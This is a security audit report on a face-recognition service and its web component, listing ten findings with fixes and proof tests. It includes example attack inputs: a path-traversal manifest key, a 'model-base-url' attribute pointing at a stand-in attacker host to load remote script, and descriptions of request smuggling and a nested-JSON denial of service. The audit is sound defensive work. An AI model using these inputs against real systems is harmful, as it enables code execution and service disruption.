# Security Audit Report

## Executive Summary
This document provides an independent security audit of the `face_inference` repository, covering the Python service/storage/HTTP layers (`src/face_inference/`), the browser runtime (`src/face_inference/web/`), and the client/embeddable web component (`packages/face-capture/`).

The threat model evaluates a public web page embedding `<face-capture>` communicating with a self-hosted `face_inference` server, as well as an attacker who controls the host page, network communication between client and server, foreign browser origins, or direct arbitrary HTTP requests.

### Findings Summary by Severity
- **Critical**: 0
- **High**: 3
- **Medium**: 4
- **Low**: 1
- **Info**: 2
- **Total Findings**: 10

---

## Findings

### High Severity

#### SEC-1: Arbitrary File Write via Path Traversal in Asset Manifest
- **Location**: `src/face_inference/assets.py:125`
- **Attack**: An attacker supplying an untrusted directory (`--from-dir`) or custom asset repository provides a `manifest.json` containing relative path traversal keys (e.g., `{"../escaped.txt": {"sha256": ...}}`). During `fetch()`, the target path is constructed via `target = dest_path / filename` without verifying that the resolved target is contained within `dest_path`.
- **Concrete Impact**: `os.replace(temp_file, target)` writes downloaded or copied files outside `target_dir`, enabling arbitrary local file overwrites (such as application code, configuration files, or user directories) across the host filesystem.
- **Recommended Fix**: Validate all manifest keys before processing. Ensure `filename` is a clean relative path and verify that `(dest_path / filename).resolve().is_relative_to(dest_path.resolve())`. Reject any entry containing parent directory references (`..`), leading slashes, or backslashes.
- **Proof Test**: `tests/test_security_audit.py::test_sec_1_manifest_path_traversal`

#### SEC-2: Python Client Forwards Sensitive Authorization Header on HTTP Redirects
- **Location**: `src/face_inference/client.py:221-222`
- **Attack**: When `FaceClient._execute_once` sends requests via `urllib.request.urlopen(req)`, it places `Authorization: Bearer <token>` in `headers`, which populates `req.headers`. If an endpoint issues an HTTP 301, 302, 307, or 308 redirect pointing to a third-party domain, Python's default `HTTPRedirectHandler` preserves all non-content headers.
- **Concrete Impact**: The sensitive master API token or scoped session token is leaked in plaintext in the `Authorization` header to external, untrusted third-party hosts.
- **Recommended Fix**: Pass the `Authorization` header via `unredirected_hdrs` in `urllib.request.Request(..., unredirected_hdrs={'Authorization': ...})`, or provide a custom `HTTPRedirectHandler` that strips `Authorization` headers whenever a redirect changes origin (scheme, host, or port).
- **Proof Test**: `tests/test_security_audit.py::test_sec_2_client_redirect_strips_authorization`

#### SEC-3: Remote Script Execution via Unvalidated `model-base-url` Dynamic Import in Web Component
- **Location**: `packages/face-capture/src/face-capture.js:361-363`, `packages/face-capture/src/config.js:24-31`
- **Attack**: An attacker who can influence DOM attributes sets `<face-capture model-base-url="https://attacker.evil.com/models/">`. When `start()` executes, `_resolveCaptureClass` resolves `new URL('browser-face/capture.mjs', modelBaseUrl).href` and directly invokes dynamic `import(/* @vite-ignore */ url)`.
- **Concrete Impact**: Arbitrary JavaScript code execution inside the origin of the hosting web page without origin restriction, domain allowlisting, or Subresource Integrity (SRI) validation.
- **Recommended Fix**: Enforce strict origin validation in `validateConfig` to ensure `modelBaseUrl` is restricted to same-origin or an explicit trusted domain allowlist. Avoid dynamic runtime `import()` of unpinned remote scripts.
- **Proof Test**: `tests/test_security_audit.py::test_sec_3_model_base_url_untrusted_origin_rejected`

---

### Medium Severity

#### SEC-4: Retention Purge Leaves Biometric Records in SQLite Free Pages and WAL Due to Missing `secure_delete`
- **Location**: `src/face_inference/storage.py:17`, `src/face_inference/service.py:57-64`
- **Attack**: When retention expires or a subject deletion is requested, `service.purge()` runs `DELETE FROM captures WHERE expires_at<=?` and nulls templates in `people`. Because `SQLiteRepository` connects with default settings (`PRAGMA secure_delete=0`), deleted rows and nullified BLOBs are not zeroed on disk; they remain in SQLite unallocated free pages and WAL frames.
- **Concrete Impact**: Anyone with access to the database file or backup storage can forensically recover deleted biometric templates and capture metadata, circumventing data retention and deletion policies.
- **Recommended Fix**: Configure `PRAGMA secure_delete = ON` (or `FAST`) in `SQLiteRepository.connect()`, and execute `VACUUM` or WAL checkpoints following purge operations.
- **Proof Test**: `tests/test_security_audit.py::test_sec_4_purge_sqlite_secure_delete_enabled`

#### SEC-5: HTTP Request Smuggling / Connection Desynchronization via Unconsumed Payload on 4xx Error
- **Location**: `src/face_inference/server.py:171-180`, `src/face_inference/server.py:273-274`
- **Attack**: An attacker sends pipelined HTTP/1.1 requests where a request body is malformed (e.g., using `Transfer-Encoding: chunked`, invalid `Content-Length`, or duplicate JSON keys). `read_json()` raises `FaceError`, and `dispatch()` catches it to send an HTTP 400 response. However, `self.close_connection = True` is not set, leaving unconsumed payload bytes in `self.rfile`.
- **Concrete Impact**: On persistent HTTP/1.1 connections, `BaseHTTPRequestHandler` treats the leftover unconsumed body bytes as the beginning of the next HTTP request, leading to HTTP request smuggling or request pipeline desynchronization.
- **Recommended Fix**: In `Handler.dispatch()`, set `self.close_connection = True` whenever a client request body fails parsing or triggers a 4xx framing error.
- **Proof Test**: `tests/test_security_audit.py::test_sec_5_body_error_closes_connection`

#### SEC-6: Worker Denial of Service via Deeply Nested JSON Payloads Causing Unhandled `RecursionError`
- **Location**: `src/face_inference/server.py:185`, `src/face_inference/server.py:189-191`
- **Attack**: An attacker submits a POST request containing a 100 KiB body with 15,000 nested JSON object brackets (`{"a":{"a":...}}`). In Python 3.12, `json.loads` exceeds the maximum recursion depth and raises `RecursionError`.
- **Concrete Impact**: Because `read_json()` only catches `(ValueError, UnicodeError)`, `RecursionError` escapes to `dispatch()`, triggering an unhandled 500 internal server error, exhausting worker thread stacks, and creating a Denial of Service condition.
- **Recommended Fix**: Explicitly catch `RecursionError` in `read_json()` and translate it to `FaceError('INVALID_JSON', 'Payload exceeds maximum nesting depth', 400)`, or enforce a maximum parsing depth check before deserialization.
- **Proof Test**: `tests/test_security_audit.py::test_sec_6_deeply_nested_json_dos`

#### SEC-7: Session Token Subject Constraint Ignored on Face Recognition Endpoint
- **Location**: `src/face_inference/server.py:249-251`
- **Attack**: An administrator issues a session token restricted to a specific subject (`scope="recognize"`, `person_id="person_a"`). An attacker or client using this token sends a recognition request to `POST /api/v1/collections/{id}/recognitions` with `eligible_ids=["person_b"]` or without `eligible_ids`. Line 249 validates `claims.subject` only when `resource == 'enrollments'`.
- **Concrete Impact**: A session token minted strictly to recognize or verify a single person can be leveraged to query and recognize any subject in the collection.
- **Recommended Fix**: Enforce that when `claims.subject` is present on a recognition token, `body.get('eligible_ids')` must strictly equal `[claims.subject]`.
- **Proof Test**: `tests/test_security_audit.py::test_sec_7_session_token_subject_binding_on_recognition`

---

### Low Severity

#### SEC-8: Absence of In-Browser Cryptographic Hash Verification for ONNX/WASM Model Binaries
- **Location**: `src/face_inference/web/browser-face/worker.mjs:9-10`
- **Attack**: The model contract specifies `detector_source_sha256` and `recognizer_source_sha256`. However, in `worker.mjs`, `ort.InferenceSession.create(assets + config.detector_file)` passes the URL directly to the ONNX runtime without computing or checking the file's SHA-256 digest in the browser.
- **Concrete Impact**: If assets are hosted on an external CDN or compromised web server, modified model binaries could be loaded and executed by the browser without detection.
- **Recommended Fix**: Download model files as `ArrayBuffer` in the browser, compute `crypto.subtle.digest('SHA-256', buffer)`, verify against `config.detector_source_sha256` and `config.recognizer_source_sha256`, and supply the validated buffer to `ort.InferenceSession.create(buffer)`.
- **Proof Test**: `tests/test_security_audit.py::test_sec_8_worker_model_hash_verification`

---

### Informational / Architectural Observations

#### SEC-9: Decoupled Submission of Observations and Template Without Server-Side Consistency Verification
- **Location**: `src/face_inference/service.py:144-148`
- **Observation**: During enrollment (`POST .../enrollments`), the client sends both raw `observations` and a pre-calculated `template`. The server validates that both are valid unit vectors, but does not verify that `template == aggregate(observations)`. A malicious client could submit benign observations while storing an arbitrary template.
- **Recommended Fix**: Verify server-side that `cosine(template, aggregate(observations)) >= 0.999`, or derive the template directly on the server from the submitted observations.

#### SEC-10: Plaintext Biometric Embeddings in Calibration and Research Data Exports
- **Location**: `src/face_inference/cli.py:70-73`, `src/face_inference/service.py:249-261`
- **Observation**: The `face-inference export` CLI command writes decrypted observation vectors and aggregate embeddings into plaintext JSONL files. While the file mode is constrained to `0o600`, administrators should be cautioned that export files contain unencrypted biometric embeddings.
- **Recommended Fix**: Add documentation notices and recommend immediate ingestion or secondary encryption for exported calibration files.

---

## Verified Sound Architectural Controls (Verified OK)

During the audit, the following critical security mechanisms were examined and confirmed to be implemented robustly:

1. **Constant-Time Authentication Comparison**:
   - `src/face_inference/server.py:144`: API token validation strictly uses `hmac.compare_digest(authorization.encode(), expected.encode())`, preventing timing side-channel attacks against the master credential.

2. **CORS and Origin Validation**:
   - `src/face_inference/server.py:115-116, 159-167`: Cross-origin requests are matched against an explicit string allowlist (`allowed_origins`). Local loopback origins are validated for exact host and server port match. `null` origins and wildcard subdomain spoofing are rejected.

3. **Path Traversal and Symlink Protections**:
   - `src/face_inference/server.py:193-195, 259-260`: Server asset paths reject `..`, `\`, and null bytes `\x00`. Asset lookup uses an explicit dictionary map of registered files, and `file.is_symlink()` is verified to prevent symlink traversal.

4. **Token Verification Order**:
   - `src/face_inference/tokens.py:89-92`: HMAC cryptographic signatures are verified across the raw encoded message payload before any untrusted JSON claims are parsed or decoded.

5. **Request Size Bounds**:
   - `src/face_inference/server.py:179-180`: Body size is bounded to `MAX_BODY = 128 * 1024` (128 KiB) prior to reading from the network socket stream, protecting against buffer exhaustion.

6. **SQL Query Parameterization**:
   - `src/face_inference/service.py`, `src/face_inference/storage.py`: All database statements uniformly employ parameterized `?` placeholders with SQLite bindings; dynamic SQL string interpolation is absent.

7. **Cryptographic Encryption at Rest**:
   - `src/face_inference/storage.py:15, 56-63`: Biometric templates and capture observations are encrypted using Fernet (AES-128-CBC with HMAC-SHA256 authenticated encryption). Database key verification is confirmed on initialization using `encryption_check`.

8. **Atomic File Operations**:
   - `src/face_inference/config.py:67-72`, `src/face_inference/assets.py:207-212`: Configuration updates and model downloads write to isolated temporary files with restrictive permissions (`0o600`) before atomic replacement via `os.replace`.

9. **Redirect Protocol Validation in Asset Fetching**:
   - `src/face_inference/assets.py:172-181`: Redirect responses during model downloading inspect `resp.geturl()` and explicitly refuse any redirect to insecure non-HTTPS protocols.
